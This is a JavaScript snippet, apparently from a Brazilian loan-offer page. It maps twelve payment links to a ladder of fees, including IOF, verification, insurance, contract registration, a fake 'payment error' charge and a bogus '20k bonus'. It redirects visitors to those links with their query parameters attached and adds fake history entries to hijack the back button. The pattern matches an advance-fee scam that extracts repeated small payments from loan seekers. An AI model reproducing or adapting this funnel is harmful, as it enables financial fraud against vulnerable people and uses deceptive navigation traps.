const baseLinks = {
    up1: "https://go.cinqpay.com.br/amvchnqgtd", // IOF
    up2: "https://go.cinqpay.com.br/67oea0oc55", // Taxa de verificação de IOF
    up3: "https://go.cinqpay.com.br/vtaww5jown", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://go.cinqpay.com.br/rkms5oxjix", // NFe
    up5: "https://go.cinqpay.com.br/lsvhuowyhu", // Ativar conta
    up6: "https://go.cinqpay.com.br/zmtwlqzzzq", // Taxa de registro do contrato
    up7: "https://go.cinqpay.com.br/0qi93citgh", // Parabéns, 20k adicional
    up8: "https://go.cinqpay.com.br/yy2czor3up", // Erro no pagamento - 14,06
    up9: "https://go.cinqpay.com.br/dhfom6ueqe", // APP - 11,99
    up10:"https://go.cinqpay.com.br/xts35ie8ri", // Taxa de Abertura TAC - 16,92
    up11:"https://go.cinqpay.com.br/t4ks6djkmt", // Taxa de Consultoria Financeira - 19,53
    up12:"https://go.cinqpay.com.br/q2s0sj2rc7" // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);



